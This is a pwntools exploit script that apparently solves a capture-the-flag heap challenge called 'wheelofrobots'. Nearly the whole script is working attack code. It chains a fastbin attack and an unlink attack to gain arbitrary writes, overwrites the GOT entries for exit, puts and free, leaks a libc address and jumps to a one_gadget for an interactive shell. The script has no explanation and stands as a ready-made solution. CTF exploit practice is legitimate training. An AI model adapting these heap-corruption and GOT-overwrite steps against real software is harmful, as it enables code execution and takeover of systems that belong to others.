from pwn import *
context(
	log_level='info',
	binary='./wheelofrobots'
)
e=context.binary
libc=e.libc
io=process()
# io=process('books',env={"LD_PRELOAD":"libc.so.6"})

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)
	

def menu(func):
	io.sendlineafter('Your choice : ',str(func))

def add(idx,content=''):
	menu(1)
	io.sendlineafter('Your choice :',str(idx))
	if idx == 2:
		io.sendlineafter('intelligence: ',str(content))
	elif idx == 3:
		io.sendlineafter('cruelty: ',str(content))
	elif idx == 6:
		io.sendlineafter('powerful: ',str(content))
	
def delete(idx):
	menu(2)
	io.sendlineafter('Your choice :',str(idx))

def change(idx,content):
	menu(3)
	io.sendlineafter('Your choice :',str(idx))
	io.sendafter('name: ',str(content))

def start():
	menu(4)


#=========================================
#VAR
end_size = 0x603130
ptr_size = 0x603138
ptr_6 = 0x6030E8 #0x6030f8
gadget = [283158,283242,983716,987463]
exit_addr = e.got['exit']
puts_addr = e.got['puts']
free_addr = e.got['free']
success('exit_addr: ' + hex(exit_addr))
success('puts_addr: ' + hex(puts_addr))
ret_addr = 0x401855
libc_off = 456336

#=========================================
add(2,1)
delete(2)
add('aaaa'+'\x01')
change(2,p64(ptr_size))

add('aaaa'+'\x00')
add(2,1)
add(3,0x20) #bypass fastbin check *0x603140 = 0x20
add(1) # fastbin attack ptr 0x603138
delete(2)
delete(3)

add(6,2) #destructor chunk
change(1,p64(0xff)) #destructor chunk size = 0xff
add(3,10)

payload = p64(0)+p64(0x20)+p64(ptr_6-0x18)+p64(ptr_6-0x10)+p64(0x20)+p64(0xd0)
change(6,payload)
delete(3)#unlink,get ptr-0x18


payload = p64(0)*5 + p64(ptr_6)#*0x6030f8(chunk1) -> 0x6030e8(chunk6)
change(6,payload)


change(1,p64(exit_addr))
change(6,p64(ret_addr))

change(1,p64(end_size))
change(6,p64(3))
# dbg()
# raw_input()
change(1, p64(puts_addr))


start()
io.recvuntil('Thx ')
libc_leak = u64(io.recvline()[:-2].ljust(8,'\x00'))
success("libc_leak: "+hex(libc_leak))

libc.address= libc_leak - libc_off
success("libc.address: "+hex(libc.address))


system_addr = libc.symbols['system']
binsh_addr = next(libc.search('/bin/sh'))


one_gadget = gadget[3] + libc.address

change(1,p64(free_addr))
change(6,p64(one_gadget))


# change(1,p64(free_addr))
# change(6,p64(system_addr))


# change(1,p64(0x6030E8))
# change(6,p64(binsh_addr))
delete(6)
# start()
# dbg()

io.interactive()
